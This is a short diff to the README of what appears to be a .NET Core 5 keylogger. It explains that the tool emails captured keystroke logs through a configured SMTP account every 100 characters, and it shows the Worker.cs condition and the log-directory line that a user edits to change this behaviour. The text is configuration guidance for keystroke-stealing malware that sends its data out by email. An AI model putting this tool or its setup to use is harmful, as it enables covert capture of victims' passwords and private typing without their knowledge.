@@ -5,6 +5,10 @@ Written using “.net core5”. Very simple to use, just add your email's and SM
 
 Every 100 characters send logs on email, you can change this by replacing condition on last “if” operator (Worker.cs)
 
+
+`
+                        if (KeyCounter % 100 == 0) // When you need to send log (in this case every 100 char's)`
+
 If you want to change directory for file, do it in 
 
 `var fileDirectory= Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // File directory`
